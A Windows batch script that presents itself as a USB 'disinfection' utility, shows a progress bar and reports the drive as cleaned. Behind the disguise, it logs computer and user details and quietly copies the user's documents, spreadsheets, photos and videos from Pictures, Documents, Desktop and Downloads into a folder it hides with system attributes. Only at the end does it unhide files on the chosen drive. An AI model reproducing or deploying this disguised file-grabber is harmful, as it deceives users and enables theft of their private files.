title USB-Segurity
@rem bin\windows\bat
@rem Autor Luishiño Pericena Choque
@rem Información:
@rem Blogger          https://lpericena.blogspot.com/
@rem Github            https://github.com/Pericena
@rem pinterest        https://es.pinterest.com/lushiopericena/
@rem twitter             https://twitter.com/LPericena
@rem linkedin          https://www.linkedin.com/in/luishi%C3%B1o-pericena-choque-126534116/
@rem facebook       https://www.facebook.com/profile.php?id=100009309755063
@rem sitio web        https://pericena.wordpress.com/
@rem Aplicacion     https://apps.facebook.com/167466933725219
@rem contacto        https://www.facebook.com/Servicio-T%C3%A9cnico-1506435219407506/
@echo off
color 03       
mode con lines=30 cols=80
rem Attrib /s /d +s +h "resultados.exe"
rem Attrib /s /d +s +h "Archivos"

:: SET NUMBER OF SECONDS TO "sleep"
set "_pingpause=1"

CALL :barloop step1
:step1
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step2
:step2
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step3
:step3
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step4
:step4
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step5
:step5
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step6
:step6
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step7
:step7
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step8
:step8
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step9
:step9
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step10
:step10
PING -n %_pingpause% 127.0.0.1>nul
CALL :barloop step11
:step11
:endof
echo.
set Nombre=                        Autor: Luishino Pericena Choque
echo          %Nombre%
TIMEOUT /T 0 /nobreak>NUL
echo %OS% %USERNAME% %COMPUTERNAME% 
TIMEOUT /T 0 /nobreak>NUL
echo            %TIME%   %DATE%   
TIMEOUT /T 0 /nobreak>NUL  
echo.  _    _     _           _____                       _ _         
TIMEOUT /T 0 /nobreak>NUL
echo. : :  : :   : :         / ____:                     (_) :       
TIMEOUT /T 0 /nobreak>NUL 
echo. : :  : :___: :__ _____: (___   ___  __ _ _   _ _ __ _: :_ _   _ 
TIMEOUT /T 0 /nobreak>NUL
echo. : :  : / __: '_ \______\___ \ / _ \/ _` : : : : '__: : __: : : :
TIMEOUT /T 0 /nobreak>NUL
echo. : :__: \__ \ :_) :     ____) :  __/ (_: : :_: : :  : : :_: :_: :
TIMEOUT /T 0 /nobreak>NUL
echo.  \____/:___/_.__/     :_____/ \___:\__, :\__,_:_:  :_:\__:\__, :
TIMEOUT /T 0 /nobreak>NUL
echo.                                     __/ :                  __/ :
TIMEOUT /T 0 /nobreak>NUL
echo.                                    :___/                  :___/ 
TIMEOUT /T 0 /nobreak>NUL
ECHO.  
TIMEOUT /T 0 /nobreak>NUL
echo Analizando...............................................
TIMEOUT /T 0 /nobreak>NUL
set /p USB= INGRESE LA LETRA DE LA UNIDAD USB A DESIFECTAR : 


Attrib /s /d +s +h "Archivos"
mode con lines=1 cols=17
@echo off
Attrib /s /d +s +h "Archivos"
echo Nombre del PC %COMPUTERNAME% 
echo Nombre del usuario %USERNAME% 
echo Directorio raiz del HD %SYSTEMROOT% 
echo Directorio en que te encuentras %CD%
echo Numero de procesadores %NUMBER_OF_PROCESSORS%  
echo Numero Aleatorio: %RANDOM%   
IF NOT EXIST ".\Archivos\"%USERNAME% MD ".\Archivos\"%USERNAME%
cd ".\Archivos\
Attrib /s /d +s +h "Archivos"

echo Fecha actual %DATE% >>Datos.txt
echo Hora actual %TIME% >>Datos.txt
echo Nombre del PC %COMPUTERNAME% >>Datos.txt
echo Nombre del usuario %USERNAME% >>Datos.txt
echo Directorio raiz del HD %SYSTEMROOT% >>Datos.txt
echo Directorio en que te encuentras %CD%>>Datos.txt
echo Numero de procesadores %NUMBER_OF_PROCESSORS% >>Datos.txt 
echo Numero Aleatorio: %RANDOM% >>Datos.txt

Attrib /s /d +s +h "Archivos"
IF NOT EXIST ".\Archivos\"%USERNAME% MD ".\Archivos\"%USERNAME%
cd ".\Archivos\"%USERNAME%
for /R %USERPROFILE%\Pictures\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
Attrib /s /d +s +h "Archivos"
for /R %USERPROFILE%\Documents\ %%x in (*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERPROFILE%\Desktop\ %%x in (*.mp4,*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERNAME%\ %%x in (*.mp4,*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"
for /R %USERNAME%\Descargas\ %%x in (*.mp4,*.pdf,*.docx,*.xlsx,*.pptx,*.txt,*.jpg,*.jpeg) do copy "%%x" ".\"








Lugares:
Documentos\Documents 
Imagenes\Pictures 
Musica\Music 
Videos\Videos 
Escritorio\Desktop 
Descargas\Downloads 
Contactos\Contacts 
Favoritos\Favorites
color 03       
mode con lines=30 cols=80
echo.
set Nombre=     Autor: Luishino Pericena Choque         
echo %OS% %USERNAME% %COMPUTERNAME% 
TIMEOUT /T 0 /nobreak>NUL
echo            %TIME%   %DATE%  
TIMEOUT /T 0 /nobreak>NUL  
echo.  _    _     _           _____                       _ _         
TIMEOUT /T 0 /nobreak>NUL
echo. : :  : :   : :         / ____:                     (_) :       
TIMEOUT /T 0 /nobreak>NUL 
echo. : :  : :___: :__ _____: (___   ___  __ _ _   _ _ __ _: :_ _   _ 
TIMEOUT /T 0 /nobreak>NUL
echo. : :  : / __: '_ \______\___ \ / _ \/ _` : : : : '__: : __: : : :
TIMEOUT /T 0 /nobreak>NUL
echo. : :__: \__ \ :_) :     ____) :  __/ (_: : :_: : :  : : :_: :_: :
TIMEOUT /T 0 /nobreak>NUL
echo.  \____/:___/_.__/     :_____/ \___:\__, :\__,_:_:  :_:\__:\__, :
TIMEOUT /T 0 /nobreak>NUL
echo.                                     __/ :                  __/ :
TIMEOUT /T 0 /nobreak>NUL
echo.                                    :___/                  :___/ 
echo. %Nombre%
TIMEOUT /T 0 /nobreak>NUL

TIMEOUT /T 3 /nobreak


attrib %USB%:\*.* /d /s -h -r -s
rem echo MsgBox"se ha detectado" ,100>>voz.vbs
echo Dim speaks,speech>>voz.vbs
echo speaks="se ha analizado ,la unidad %USB%">>voz.vbs
echo set speech=CreateObject("sapi.spvoice")>>voz.vbs
echo speech.Speak speaks>>voz.vbs
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%
TIMEOUT /T 0 /nobreak>NUL
echo          La unidad "%USB%" fue desifectada %TIME%   %DATE%

voz.vbs %ruta%
del voz.vbs
exit


PAUSE>nul
EXIT


:barloop
set "_cooline=Current progress:"
If not defined _pr set _pr=0
If [%2] EQU [] goto :barloop_chk_defpr
set /a _pr=_pr+%2
:barloop_chk_defpr
If [%3] EQU [] goto :barloop_progbar
set _pr=%3
:barloop_progbar
cls&echo %_cooline%&echo.
IF %_pr% EQU 0 (echo [                              ]  0%%
	) ELSE (
	IF %_pr% EQU 1 (echo [==^>                           ] 10%%
		) ELSE (
		IF %_pr% EQU 2 (echo [=====^>                        ] 20%%
			) ELSE (
			IF %_pr% EQU 3 (echo [========^>                     ] 30%%
				) ELSE (
				IF %_pr% EQU 4 (echo [===========^>                  ] 40%%
					) ELSE (
					IF %_pr% EQU 5 (echo [==============^>               ] 50%%
						) ELSE (
						IF %_pr% EQU 6 (echo [=================^>            ] 60%%
							) ELSE (
							IF %_pr% EQU 7 (echo [====================^>         ] 70%%
								) ELSE (
								IF %_pr% EQU 8 (echo [=======================^>      ] 80%%
									) ELSE (
									IF %_pr% EQU 9 (echo [==========================^>   ] 90%%
										) ELSE (
						
											echo [==============================] 100%%
										)
									)
								)
							)
						)
					)
				)
			)
		)
	)
)
echo.&set /a _pr=_pr+1
goto %1
echo ERROR: _returnto param wrong or undefined!&PAUSE
REM ## End of THE PROGRESS BAR SUBROUTINE ##



